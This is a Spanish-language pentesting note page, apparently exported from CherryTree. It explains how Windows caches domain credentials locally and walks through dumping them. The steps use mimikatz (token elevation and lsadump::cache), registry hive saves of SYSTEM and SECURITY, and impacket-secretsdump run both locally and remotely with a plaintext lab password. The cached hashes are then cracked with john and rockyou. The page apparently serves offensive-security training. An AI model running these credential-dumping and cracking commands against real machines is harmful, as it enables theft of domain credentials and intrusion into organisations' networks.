<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>VolcadoCredenciales de dominio cacheadas (mscash)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>VolcadoCredenciales de dominio cacheadas (mscash)</h1><br/><p><h1>COMO SE AUTENTICA UN USUARIO DE DOMINIO EN UNA MAQUINA QUE NO TIENE CONEXIÓN CON LA BASE DE DATOS DEL DC NTDS</h1>.</p><p></p><p>Esto se debe a las credenciales de dominio que se cachean en una maquina windows de manera local al autenticarse por primera vez.</p><p></p><p>Esto permite que habiendo comprometido un usuario local podemos acceder a ese cacheo de credenciales.</p><p></p><p>En el usuario local de WS01:</p><p><img src="images/36-1.png" alt="images/36-1.png" /></p><p></p><p></p><p><h3>CON MIMIKATZ:</h3></p><p></p><p><img src="images/36-2.png" alt="images/36-2.png" /></p><p></p><p>Suplantamos de nuevo el token de system porque necesitamos esos privilegios:</p><p></p><p><div class="codebox"><pre><br />privilege<span style="color:#000000;font-weight:700">::</span>debug<br />token<span style="color:#000000;font-weight:700">::</span>elevate<br /></pre></div></p><p></p><p><img src="images/36-3.png" alt="images/36-3.png" /></p><p></p><p><div class="codebox"><pre><br />lsadump<span style="color:#000000;font-weight:700">::</span>cache</pre></div></p><p></p><p><img src="images/36-4.png" alt="images/36-4.png" /></p><p></p><p>Como vemos se tratan de todas las credenciales cacheadas de todos los usuarios que iniciaron sesión en este equipo en algún momento en ese formato de hash.</p><p></p><p>Las podemos llevar a kali y crackearlas:</p><p></p><p><div class="codebox"><pre><br />john -format=mscash2 hash.hash -wordlist=<span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>wordlists<span style="color:#000000;font-weight:700">/</span>rockyou.txt</pre></div></p><p></p><p></p><p></p><p></p><p></p><p><h3>CON  EL REGISTRO</h3></p><p></p><p><div class="codebox"><pre><br />reg save hklm<span style="color:#000000;font-weight:700">\</span>system system.save<br />reg save hklm<span style="color:#000000;font-weight:700">\</span>security security.save<br /></pre></div></p><p></p><p>Los pasamos a Kali:</p><p></p><p><div class="codebox"><pre><br />impacket-secretsdump -system system.save -security security.save LOCAL</pre></div></p><p></p><p><img src="images/36-5.png" alt="images/36-5.png" /></p><p></p><p></p><p>Ahora si copiamos los hashes y de igual forma:</p><p></p><p><div class="codebox"><pre><br />john -format=mscash2 hash.hash -wordlist=<span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>wordlists<span style="color:#000000;font-weight:700">/</span>rockyou.txt</pre></div></p><p></p><p><img src="images/36-6.png" alt="images/36-6.png" /></p><p></p><p></p><p>De forma remota de igual forma:</p><p></p><p><div class="codebox"><pre><br />impacket-secretsdump empleado1<span style="color:#000000;font-weight:700">:</span>Passw0rd1@192.168.20.131</pre></div></p><p></p><p><img src="images/36-7.png" alt="images/36-7.png" /></p><p></p></div>
</body>
</html>
